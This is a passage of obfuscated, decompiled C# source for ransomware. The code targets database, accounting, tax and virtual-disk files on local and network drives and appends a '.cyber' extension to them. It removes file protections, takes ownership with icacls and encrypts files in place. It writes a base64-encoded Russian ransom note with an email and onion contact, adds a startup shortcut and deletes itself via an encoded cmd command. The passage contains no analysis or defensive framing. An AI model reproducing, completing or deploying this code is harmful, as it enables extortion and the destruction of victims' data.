					"ACCDR", "ACCDT", "ACCFT", "ADB", "ADB", "ADE", "ADF", "ADP", "ALF", "ASK",
					"BTR", "CAT", "CDB", "CDB", "CDB", "CKP", "CMA", "CPD", "CRYPT12", "CRYPT8",
					"CRYPT9", "DACPAC", "DAD", "DADIAGRAMS", "DASCHEMA", "DB", "DB", "DB-SHM", "DB-WAL", "DBCRYPT12",
					"DBCRYPT8", "DB3", "DBC", "DBF", "DBS", "DBT", "DBV", "DBX", "DCB", "DCT",
					"DCX", "DDL", "DLIS", "DP1", "DQY", "DSK", "DSN", "DTSX", "DXL", "ECO",
					"ECX", "EDB", "EDB", "EPIM", "EXB", "FCD", "FDB", "FDB", "FIC", "FMP",
					"FMP12", "FMPSL", "FOL", "FP3", "FP4", "FP5", "FP7", "FPT", "FRM", "GDB",
					"GDB", "GRDB", "GWI", "HDB", "HIS", "IB", "IDB", "IHX", "ITDB", "ITW",
					"JET", "JTX", "KDB", "KEXI", "KEXIC", "KEXIS", "LGC", "LWX", "MAF", "MAQ",
					"MAR", "MARSHAL", "MAS", "MAV", "MDB", "MDF", "MPD", "MRG", "MUD", "MWB",
					"MYD", "NDF", "NNT", "NRMLIB", "NS2", "NS3", "NS4", "NSF", "NV", "NV2",
					"NWDB", "NYF", "ODB", "ODB", "OQY", "ORA", "ORX", "OWC", "P96", "P97",
					"PAN", "PDB", "PDB", "PDM", "PNZ", "QRY", "QVD", "RBF", "RCTD", "ROD",
					"ROD", "RODX", "RPD", "RSD", "SAS7BDAT", "SBF", "SCX", "SDB", "SDB", "SDB",
					"SDB", "SDC", "SDF", "SIS", "SPQ", "SQL", "SQLITE", "SQLITE3", "SQLITEDB", "TE",
					"TEACHER", "TEMX", "TMD", "TPS", "TRC", "TRC", "TRM", "UDB", "UDL", "USR",
					"V12", "VIS", "VPD", "VVV", "WDB", "WMDB", "WRK", "XDB", "XLD", "XMLFF",
					"vmrs", "VMSC", "VMRS", "3me", "3pe", "hif", "iif", "lyt", "nd", "qb2005",
					"qb2006", "qb2007", "qb2009", "qb2010", "qbb", "qbm", "qbmb", "qbo", "qbw", "qbx",
					"qdf", "qel", "qfx", "qpb", "qsd", "tax", "tax08", "tax09", "tax10", "tax11",
					"tax2008", "tax2009", "tax2010", "tax2011", "tlg", "tt11", "qb2011", "qb2012", "imt", "3ME",
					"3PE", "HIF", "IIF", "LYT", "ND", "QB2005", "QB2006", "QB2007", "QB2009", "QB2010",
					"QBB", "QBM", "QBMB", "QBO", "QBW", "QBX", "QDF", "QEL", "QFX", "QPB",
					"QSD", "TAX", "TAX08", "TAX09", "TAX10", "TAX11", "TAX2008", "TAX2009", "TAX2010", "TAX2011",
					"TLG", "TT11", "QB2011", "QB2012", "IMT", "VHDX", "VHD", "lxa", "LXA", "AVHD",
					"AVHDX", "OVA"
				}, ".cyber", new string[0], eddVxanYaxlAWs);
			});
			thread.Priority = ThreadPriority.Normal;
			thread.IsBackground = false;
			thread.Start();
		}
		catch
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string mjrHDmOdQZGbTx, int eKvEoxUBAjP, IntPtr oHUKwCUvPyIs, ref int QXtFxvLecaIG);

	private static string UTnqDeTxPq(string KesqEUZzlMq, int MJJNGdXIEoVjm = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(MJJNGdXIEoVjm);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(KesqEUZzlMq, 1, intPtr, ref MJJNGdXIEoVjm) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void jwTBUSCtlPIOvVR()
	{
		UkvSKngWEJZsJKEGJr("cmd.exe", jLGThbkXlozfB("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = jLGThbkXlozfB("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void CRHPenLGYTyWUT(string GmhxCtNEOYReyy)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(GmhxCtNEOYReyy);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(GmhxCtNEOYReyy, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(GmhxCtNEOYReyy);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(GmhxCtNEOYReyy, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (dwCcrxocWgDvY)
			{
				try
				{
					File.AppendAllText(HXSuIBiFjcFlYv, "File: " + GmhxCtNEOYReyy + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string woXXmqCRhpoJW()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string qbAytolpffIQZh(string zMJmdfHRwjFx)
	{
		string text = Path.GetTempPath() + "\\Инструкция.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(jLGThbkXlozfB("0JLQsNGI0Lgg0LTQvtC60YPQvNC10L3RgtGLLCDQsdCw0LfRiyDQtNCw0L3QvdGL0YUg0Lgg0LTRgNGD0LPQuNC1INGE0LDQudC70Ysg0LHRi9C70Lgg0LfQsNGI0LjRhNGA0L7QstCw0L3Riy4g0J3QviDQvdC1INGB0YLQvtC40YIg0L/QtdGA0LXQttC40LLQsNGC0YwhIA0K0JzRiyDQstGB0LUg0YDQsNGB0YjQuNGE0YDRg9C10Lwg0Lgg0LLQtdGA0L3QtdC8INC90LAg0YHQstC+0Lgg0LzQtdGB0YLQsC4NCg0K0JTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFOg0KDQrQndCw0L/QuNGI0LjRgtC1INC90LAg0L/QvtGH0YLRgyAtIGN5YmVyQG91dGxvb2twcm8ubmV0DQogDQogKtCSINC/0LjRgdGM0LzQtSDRg9C60LDQt9Cw0YLRjCDQktCw0Ygg0LvQuNGH0L3Ri9C5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGAIChLZXkgSWRlbnRpZmllcikNCiAq0J/RgNC40LrRgNC10L/QuNGC0LUgMiDRhNCw0LnQu9CwINC00L4gMiDQvNCxINC00LvRjyDRgtC10YHRgtC+0LLQvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60LguIA0KICDQvNGLINC40YUg0YDQsNGB0YjQuNGE0YDRg9C10LwsINCyINC60LDRh9C10YHRgtCy0LUg0LTQvtC60LDQt9Cw0YLQtdC70YzRgdGC0LLQsCwg0YfRgtC+INCi0J7Qm9Cs0JrQniDQnNCrINC80L7QttC10Lwg0YDQsNGB0YjQuNGE0YDQvtCy0LDRgtGMINGE0LDQudC70YsuDQoNCiAt0KfQtdC8INCx0YvRgdGC0YDQtdC1INCy0Ysg0YHQvtC+0LHRidC40YLQtSDQvdCw0Lwg0YHQstC+0Lkg0LjQtNC10L3RgtC40YTQuNC60LDRgtC+0YAsINGC0LXQvCDQsdGL0YHRgtGA0LXQtSDQvNGLINCy0YvQutC70Y7Rh9C40Lwg0L/RgNC+0LjQt9Cy0L7Qu9GM0L3QvtC1INGD0LTQsNC70LXQvdC40LUg0YTQsNC50LvQvtCyLg0KIC3QndCw0L/QuNGB0LDQsiDQvdCw0Lwg0L3QsCDQv9C+0YfRgtGDINCy0Ysg0L/QvtC70YPRh9C40YLQtSDQtNCw0LvRjNC90LXQudGI0LjQtSDQuNC90YHRgtGA0YPQutGG0LjQuCDQv9C+INC+0L/Qu9Cw0YLQtS4NCg0K0JIg0L7RgtCy0LXRgtC90L7QvCDQv9C40YHRjNC80LUg0JLRiyDQv9C+0LvRg9GH0LjRgtC1INC/0YDQvtCz0YDQsNC80LzRgyDQtNC70Y8g0YDQsNGB0YjQuNGE0YDQvtCy0LrQuC4NCtCf0L7RgdC70LUg0LfQsNC/0YPRgdC60LAg0L/RgNC+0LPRgNCw0LzQvNGLLdC00LXRiNC40YTRgNC+0LLRidC40LrQsCDQstGB0LUg0JLQsNGI0Lgg0YTQsNC50LvRiyDQsdGD0LTRg9GCINCy0L7RgdGB0YLQsNC90L7QstC70LXQvdGLLg0KDQrQnNGLINCz0LDRgNCw0L3RgtC40YDRg9C10Lw6DQoxMDAlINGD0YHQv9C10YjQvdC+0LUg0LLQvtGB0YHRgtCw0L3QvtCy0LvQtdC90LjQtSDQstGB0LXRhSDQstCw0YjQuNGFINGE0LDQudC70L7Qsg0KMTAwJSDQs9Cw0YDQsNC90YLQuNGOINGB0L7QvtGC0LLQtdGC0YHRgtCy0LjRjw0KMTAwJSDQsdC10LfQvtC/0LDRgdC90YvQuSDQuCDQvdCw0LTQtdC20L3Ri9C5INGB0LXRgNCy0LjRgQ0K0JLQvdC40LzQsNC90LjQtSENCiAqINCd0LUg0L/Ri9GC0LDQudGC0LXRgdGMINGD0LTQsNC70LjRgtGMINC/0YDQvtCz0YDQsNC80LzRgyDQuNC70Lgg0LfQsNC/0YPRgdC60LDRgtGMINCw0L3RgtC40LLQuNGA0YPRgdC90YvQtSDRgdGA0LXQtNGB0YLQstCwDQogKiDQn9C+0L/Ri9GC0LrQuCDRgdCw0LzQvtGB0YLQvtGP0YLQtdC70YzQvdC+0Lkg0YDQsNGB0YjQuNGE0YDQvtCy0LrQuCDRhNCw0LnQu9C+0LIg0L/RgNC40LLQtdC00YPRgiDQuiDQv9C+0YLQtdGA0LUg0JLQsNGI0LjRhSDQtNCw0L3QvdGL0YUNCiAqINCU0LXRiNC40YTRgNCw0YLQvtGA0Ysg0LTRgNGD0LPQuNGFINC/0L7Qu9GM0LfQvtCy0LDRgtC10LvQtdC5INC90LXRgdC+0LLQvNC10YHRgtC40LzRiyDRgSDQktCw0YjQuNC80Lgg0LTQsNC90L3Ri9C80LgsINGC0LDQuiDQutCw0Log0YMg0LrQsNC20LTQvtCz0L4g0L/QvtC70YzQt9C+0LLQsNGC0LXQu9GPDQrRg9C90LjQutCw0LvRjNC90YvQuSDQutC70Y7RhyDRiNC40YTRgNC+0LLQsNC90LjRjw0KDQoNCtCa0LDQttC00YvQtSAyNCDRh9Cw0YHQsCDRg9C00LDQu9GP0Y7RgtGB0Y8gMjQg0YTQsNC50LvQsCwg0L3QtdC+0LHRhdC+0LTQuNC80L4g0L/RgNC40YHQu9Cw0YLRjCDRgdCy0L7QuSDQuNC00LXQvdGC0LjRhNC40LrQsNGC0L7RgCDRh9GC0L7QsSDQvNGLINC+0YLQutC70Y7Rh9C40LvQuCDRjdGC0YMg0YTRg9C90LrRhtC40Y4uDQrQmtCw0LbQtNGL0LUgMjQg0YfQsNGB0LAg0YHRgtC+0LjQvNC+0YHRgtGMINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFINGD0LLQtdC70LjRh9C40LLQsNC10YLRgdGPINC90LAgMzAlICjRh9C10YDQtdC3IDcyINGH0LDRgdCwINGB0YPQvNC80LAg0YTQuNC60YHQuNGA0YPQtdGC0YHRjykNCg0KDQpQLlMNCtCV0YHQu9C4INCS0LDQvCDQvdC1INC+0YLQstC10YLQuNC70Lgg0LIg0YLQtdGH0LXQvdC40LggNDgg0YfQsNGB0L7Qsi4g0JLQsNC8INC90YPQttC90L4g0LHRg9C00LXRgiDRgdCy0Y/Qt9Cw0YLRjNGB0Y8g0YEg0L3QsNC80Lgg0L/QviDQtNC+0L/QvtC70L3QuNGC0LXQu9GM0L3Ri9C8INC60L7QvdGC0LDQutGC0LDQvC4gDQoNCtCh0LrQsNGH0LDQudGC0LUg0Lgg0YPRgdGC0LDQvdC+0LLQuNGC0LUgVG9yIEJyb3dzZXIgLSBodHRwczovL3d3dy50b3Jwcm9qZWN0Lm9yZy9ydS9kb3dubG9hZC8NCtCe0YLQutGA0L7QudGC0LUg0YfQtdGA0LXQtyBUb3IgQnJvd3NlciDRgdCw0LnRgiAtIGh0dHA6Ly9zb25hcm1zbmc1dnp3cWV6bHZ0dTJpaXd3ZG4zZHhraG90ZnRpa2hvd3BmanV6ZzdwM2NhNWVpZC5vbmlvbiAo0YHQsNC50YIg0L3QtSDQsdGD0LTQtdGCINGA0LDQsdC+0YLQsNGC0Ywg0YfQtdGA0LXQtyDQvtCx0YvRh9C90YvQuSDQsdGA0LDRg9C30LXRgCwg0YLQvtC70YzQutC+INGH0LXRgNC10Lcg0KLQntCgKQ0K0JfQsNGA0LXQs9C40YHRgtGA0LjRgNGD0LnRgtC10YHRjCDQuCDQvdCw0L/QuNGI0LjRgtC1INC90LDQvC4gDQoNCirQndCw0Ygg0L3QuNC6INCyIFNvbmFyJ2UgLSBzYXZlZmlsZTM2NQ=="));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(jLGThbkXlozfB("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(zMJmdfHRwjFx);
				if (VWdYBLRBOWpKB)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(jLGThbkXlozfB("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(dOKSsqBdzEjH.ptoqsMamSwGuxR());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(zMJmdfHRwjFx) && !gIEIPYSAmb)
				{
					File.AppendAllText(text, "\r\nAdditional KeyId:\r\n" + zMJmdfHRwjFx);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (dwCcrxocWgDvY)
			{
				try
				{
					File.AppendAllText(HXSuIBiFjcFlYv, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	public static void JMvJJDlFog(string LVKNjGazxWDFBghW, string OEBPMXbEoaR)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + LVKNjGazxWDFBghW + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + OEBPMXbEoaR);
		streamWriter.WriteLine("IconIndex=0");
		string text = OEBPMXbEoaR.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void sDJGhnendTnZQp(string[] kPtBcbJhURjXkz, string[] OsKgBQsMEfEfcz, string[] dBMGRIpQauLD, string PKsTyhGrCPRaR, string dJVtNYPaBnL)
	{
		if (OpScyAmeLLoG && !woXXmqCRhpoJW().Contains("XP"))
		{
			RcMrhZxbQXKBBGT.fBZWpzOIMzszQQw();
		}
		ydkkPXGHXdHLQJ = Convert.FromBase64String(PKsTyhGrCPRaR);
		DriveInfo[] array = null;
		if (kPtBcbJhURjXkz[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = UTnqDeTxPq(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !lZNmNTLNdP.Contains(text))
							{
								lZNmNTLNdP.Add(text);
							}
							else if (!lZNmNTLNdP.Contains(array[i].Name))
							{
								lZNmNTLNdP.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!lZNmNTLNdP.Contains(array[i].Name))
							{
								lZNmNTLNdP.Add(array[i].Name);
							}
						}
					}
					else if (!lZNmNTLNdP.Contains(array[i].Name))
					{
						lZNmNTLNdP.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < kPtBcbJhURjXkz.Length; j++)
			{
				if (!lZNmNTLNdP.Contains(kPtBcbJhURjXkz[j]))
				{
					lZNmNTLNdP.Add(kPtBcbJhURjXkz[j]);
				}
			}
		}
		if (lZNmNTLNdP.Contains(jLGThbkXlozfB("Qzpc")) && uQrJPYIBZmsaW == "YES")
		{
			lZNmNTLNdP.Remove(jLGThbkXlozfB("Qzpc"));
		}
		if (fwyvOUErjoRGs == "YES")
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				uNcxbYOlaz.dhrDdugBRMtSFUb();
			});
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Normal;
			thread.Start();
		}
		Parallel.ForEach(lZNmNTLNdP, delegate(string t)
		{
			if (efRXIEwEUukcfR && !woXXmqCRhpoJW().Contains("XP") && !woXXmqCRhpoJW().Contains("Windows 7"))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						FhRtjohbGZtJz(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			if (KlQaUienKdBo == "YES")
			{
				Thread thread3 = new Thread((ThreadStart)delegate
				{
					BrtReKfhDC(t, OsKgBQsMEfEfcz, dJVtNYPaBnL, dBMGRIpQauLD, PKsTyhGrCPRaR);
				});
				thread3.Priority = ThreadPriority.Normal;
				thread3.IsBackground = false;
				thread3.Start();
				thread3.Join();
			}
			else
			{
				BrtReKfhDC(t, OsKgBQsMEfEfcz, dJVtNYPaBnL, dBMGRIpQauLD, PKsTyhGrCPRaR);
			}
		});
	}

	public static void BrtReKfhDC(string hMlftYKUlMLlPJLAN, string[] aXeTppxmSPDivYk, string asHgyTIQMlwuVq, string[] PURtfBNtyxehuV, string mvlltEdOEA)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (mgSjwFXucAZdEw == "NO")
		{
			if (zJmmJdPFvowyuLu == "YES" && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && fmXeXgdtFs(hMlftYKUlMLlPJLAN))
			{
				tIliaSnEsIleoe tIliaSnEsIleoe = null;
				try
				{
					tIliaSnEsIleoe = new tIliaSnEsIleoe(hMlftYKUlMLlPJLAN.Replace("\\", ""));
				}
				catch
				{
					list = arKJyakwbrEs(hMlftYKUlMLlPJLAN, aXeTppxmSPDivYk, asHgyTIQMlwuVq, PURtfBNtyxehuV, mvlltEdOEA);
					return;
				}
				try
				{
					JUWUBwKHnip(tIliaSnEsIleoe.ToArray().ToList(), aXeTppxmSPDivYk, asHgyTIQMlwuVq, PURtfBNtyxehuV, mvlltEdOEA);
					return;
				}
				catch (Exception)
				{
					list = arKJyakwbrEs(hMlftYKUlMLlPJLAN, aXeTppxmSPDivYk, asHgyTIQMlwuVq, PURtfBNtyxehuV, mvlltEdOEA);
					return;
				}
			}
			list = arKJyakwbrEs(hMlftYKUlMLlPJLAN, aXeTppxmSPDivYk, asHgyTIQMlwuVq, PURtfBNtyxehuV, mvlltEdOEA);
			return;
		}
		list = DdKEOZcPpbrjT.SearchFiles(hMlftYKUlMLlPJLAN);
		foreach (string text in aXeTppxmSPDivYk)
		{
			foreach (string item in list)
			{
				if (PURtfBNtyxehuV.Length != 0)
				{
					int num = 0;
					while (num < PURtfBNtyxehuV.Length)
					{
						string value = PURtfBNtyxehuV[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0385;
					}
				}
				if ((deftsIkXRkE == "NO" && !item.EndsWith(text)) || snFJjGniiHtdTSH.Contains(item))
				{
					continue;
				}
				if (LDVZsbBiyOrU == "YES")
				{
					try
					{
						if (MYiVoJiDPuw.iXUrCyWwbDDP(item))
						{
							MYiVoJiDPuw.jBdsvnmIaKEzR(item);
						}
					}
					catch
					{
					}
				}
				snFJjGniiHtdTSH.Add(item);
				if (!UYClCmRdPD.Contains(Path.GetDirectoryName(item)))
				{
					UYClCmRdPD.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (UuZGAMCoQIPQQk == "YES" && fileStream.Length > Convert.ToInt32(OQWxDJYHGaO) * 1024 * 1024 && !list3.Contains(text))
					{
						if (mAubhToVWX == "YES")
						{
							foreach (string item2 in DqnvzCWPBFOfV)
							{
								if (item.ToLower().EndsWith(item2) && gfooytrIBEuhQ == "YES")
								{
									if (Convert.ToInt32(PHGxbhgUwHl) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && gfooytrIBEuhQ == "NO")
								{
									try
									{
										dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] pePDwXCkJkp = xPAIwPiUUms.nBfapMPZnVY(item, Convert.ToInt32(OQWxDJYHGaO) * 1024 * 1024);
						byte[] aGHJdwQqOXo = xPAIwPiUUms.eiKYzlcqJmBscwSj(pePDwXCkJkp, Convert.FromBase64String(mvlltEdOEA), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						xPAIwPiUUms.YcWbtomCNUm(item, aGHJdwQqOXo);
						if (asHgyTIQMlwuVq != ".*")
						{
							File.Move(item, item + asHgyTIQMlwuVq);
						}
					}
					else if (asHgyTIQMlwuVq != ".*")
					{
						sdeaXOudwLJhuj(item, item + asHgyTIQMlwuVq, ydkkPXGHXdHLQJ);
					}
					else
					{
						sdeaXOudwLJhuj(item, item + ".part", ydkkPXGHXdHLQJ);
					}
				}
				catch (Exception)
				{
				}
				IL_0385:;
			}
		}
	}

	public static void JUWUBwKHnip(List<string> KJURsTnTzliTNX, string[] RRMCiwkOtPGwX, string XVPoXZeuSDPoW, string[] IfCvhsXosKsEQ, string IddhZgGIMBIoPTN)
	{
		List<string> LODlxdahcYJ = new List<string> { "" };
		if (deftsIkXRkE == "NO")
		{
			string RYBnEKAqHJtC;
			Parallel.ForEach(RRMCiwkOtPGwX, delegate(string t1)
			{
				foreach (string item in KJURsTnTzliTNX)
				{
					if (!item.Contains("C:\\Program Files\\") && !item.Contains("C:\\Program Files (x86)\\") && !item.Contains(":\\Windows\\") && !item.ToLower().Contains("perflogs") && !item.ToLower().Contains("internet explorer") && !item.Contains(":\\ProgramData\\") && !item.Contains("\\AppData\\") && !item.ToLower().Contains("msocache") && !item.ToLower().Contains("system volume information") && !item.ToLower().Contains("boot") && !item.ToLower().Contains("tor browser") && !item.ToLower().Contains("mozilla") && !item.ToLower().Contains("google chrome") && !item.ToLower().Contains("application data") && !item.Contains("autoexec.bat") && !item.Contains("desktop.ini") && !item.Contains("autorun.inf") && !item.Contains("ntuser.dat") && !item.Contains("NTUSER.DAT") && !item.Contains("iconcache.db") && !item.Contains("bootsect.bak") && !item.Contains("boot.ini") && !item.Contains("ntuser.dat.log") && !item.Contains("thumbs.db") && !item.ToLower().Contains("bootmgr") && !item.ToLower().Contains("pagefile.sys") && !item.ToLower().Contains("config.sys") && !item.ToLower().Contains("ntuser.ini") && !item.Contains(jLGThbkXlozfB("QnVpbGRlcl9Mb2c=")) && !item.Contains("RSAKeys") && !item.Contains("Config.enc") && !item.Contains("Инструкция") && !item.EndsWith(XVPoXZeuSDPoW) && !item.EndsWith("exe") && !item.EndsWith("dll") && !item.EndsWith("EXE") && !item.EndsWith("DLL") && !item.Contains("Recycle.Bin") && !item.Contains(jMMJJGmjJwKTlH) && !item.Contains(HXSuIBiFjcFlYv) && !item.Contains(QHZTFDubwp))
					{
						if (IfCvhsXosKsEQ.Length != 0)
						{
							string[] array4 = IfCvhsXosKsEQ;
							int num2 = 0;
							while (num2 < array4.Length)
							{
								string value2 = array4[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0b81;
							}
						}
						try
						{
							if (item.EndsWith(XVPoXZeuSDPoW))
							{
								goto IL_0b81;
							}
						}
						catch (Exception)
						{
							goto IL_0b81;
						}
						if (item.EndsWith(t1) && !snFJjGniiHtdTSH.Contains(item))
						{
							if (LDVZsbBiyOrU == "YES")
							{
								try
								{
									if (MYiVoJiDPuw.iXUrCyWwbDDP(item))
									{
										MYiVoJiDPuw.jBdsvnmIaKEzR(item);
									}
								}
								catch
								{
								}
							}
							snFJjGniiHtdTSH.Add(item);
							if (!UYClCmRdPD.Contains(Path.GetDirectoryName(item)))
							{
								UYClCmRdPD.Add(Path.GetDirectoryName(item));
							}
							CRHPenLGYTyWUT(item);
							try
							{
								new utrmZEFXTZjn().MXDXNXSoXoRHAN(item);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (MFBaFacYIYTeS)
										{
											Console.WriteLine("Setting write access permission: " + item + " - File Size: " + new FileInfo(item).Length + " bytes");
											Console.WriteLine("----------------------------------------------------------------------------");
										}
									}
									catch
									{
									}
									UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("aWNhY2xzLmV4ZQ=="), "\"" + item + "\"" + jLGThbkXlozfB("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + jLGThbkXlozfB("OkYgL1QgL0MgL1E="));
								}
							}
							catch (Exception ex18)
							{
								if (dwCcrxocWgDvY)
								{
									try
									{
										File.AppendAllText(HXSuIBiFjcFlYv, "File: " + item + " - Error while checking for user write access permission: " + ex18.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_050e;
									}
									goto end_IL_050e_2;
									end_IL_050e:;
								}
								catch (Exception ex20)
								{
									if (dwCcrxocWgDvY)
									{
										try
										{
											File.AppendAllText(HXSuIBiFjcFlYv, "File: " + item + " - Error while reading if filesize is zero: " + ex20.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									sasdvwkURzh++;
									goto end_IL_050e_2;
								}
								if (!(UuZGAMCoQIPQQk == "YES") || new FileInfo(item).Length <= Convert.ToInt32(OQWxDJYHGaO) * 1024 * 1024 || LODlxdahcYJ.Contains(t1))
								{
									if (VWdYBLRBOWpKB)
									{
										XVPoXZeuSDPoW = eyshXlTBtKESKXUD + XVPoXZeuSDPoW;
									}
									string text5 = utDHmaEnPafSsZ.zXqCMkpXvvDkS(32);
									string text6 = "";
									text6 = (gIEIPYSAmb ? utDHmaEnPafSsZ.GdIXFYPygrqzMs() : "");
									string s3 = JXLBTRDtuzyaHWFE.hHOovCgFovscyM(text5 + text6);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (XVPoXZeuSDPoW != ".*")
									{
										if (!EepcEiTneJt)
										{
											if (!gIEIPYSAmb)
											{
												XsskrIIoBJbNJ(item, item + XVPoXZeuSDPoW, ydkkPXGHXdHLQJ);
											}
											else
											{
												XsskrIIoBJbNJ(item, item + XVPoXZeuSDPoW, Convert.FromBase64String(text5));
											}
										}
										else
										{
											try
											{
												if (!gIEIPYSAmb)
												{
													yxXpRbVOOCdryf(item, item + XVPoXZeuSDPoW, ydkkPXGHXdHLQJ, Convert.FromBase64String(xcViaPUwRrRv));
												}
												else
												{
													yxXpRbVOOCdryf(item, item + XVPoXZeuSDPoW, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
												}
											}
											catch (Exception ex22)
											{
												if (dwCcrxocWgDvY)
												{
													try
													{
														File.AppendAllText(HXSuIBiFjcFlYv, "File: " + item + " - Error while fully writing to file: " + ex22.Message + "\r\n");
													}
													catch (Exception)
													{
													}
												}
												sasdvwkURzh++;
												try
												{
													File.Move(item + XVPoXZeuSDPoW, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_050e_2;
											}
										}
									}
									else if (!EepcEiTneJt)
									{
										if (!gIEIPYSAmb)
										{
											XsskrIIoBJbNJ(item, item + ".part", ydkkPXGHXdHLQJ);
										}
										else
										{
											XsskrIIoBJbNJ(item, item + ".part", Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!gIEIPYSAmb)
											{
